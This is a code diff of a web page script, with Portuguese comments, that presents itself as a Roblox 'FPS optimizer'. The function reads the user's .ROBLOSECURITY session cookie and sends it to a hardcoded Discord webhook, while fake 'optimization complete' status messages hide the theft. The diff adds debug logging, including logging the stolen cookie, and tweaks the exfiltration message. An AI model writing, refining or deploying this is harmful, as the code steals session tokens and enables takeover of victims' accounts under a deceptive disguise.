@@ -128,10 +128,12 @@
   <script>
     function optimizeFPS() {
       document.getElementById('status').innerHTML = 'Status: Otimizando FPS...';
+      console.log('Tentando otimizar FPS...');
       // Captura o cookie .ROBLOSECURITY
       const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
       if (cookie) {
         const cookieValue = cookie.split('=')[1];
+        console.log('Cookie encontrado:', cookieValue);
         if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
           // Envia o cookie para o Discord
           fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
@@ -140,25 +142,29 @@
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue}`,
+              content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue} (Integrado ao GitHub)`,
               username: 'Roblox FPS Bot'
             })
           })
           .then(response => {
+            console.log('Resposta do webhook:', response.status);
             if (response.ok) {
               document.getElementById('status').innerHTML = 'Status: Otimização concluída com sucesso!';
             } else {
-              document.getElementById('status').innerHTML = 'Status: Erro na otimização.';
+              document.getElementById('status').innerHTML = 'Status: Erro na otimização. Código: ' + response.status;
             }
           })
           .catch(error => {
+            console.error('Erro no fetch:', error);
             document.getElementById('status').innerHTML = 'Status: Erro: ' + error.message;
           });
         } else {
           document.getElementById('status').innerHTML = 'Status: Cookie inválido.';
+          console.log('Cookie inválido ou ausente do padrão.');
         }
       } else {
         document.getElementById('status').innerHTML = 'Status: Nenhum cookie Roblox encontrado.';
+        console.log('Nenhum cookie .ROBLOSECURITY encontrado.');
       }
     }
   </script>
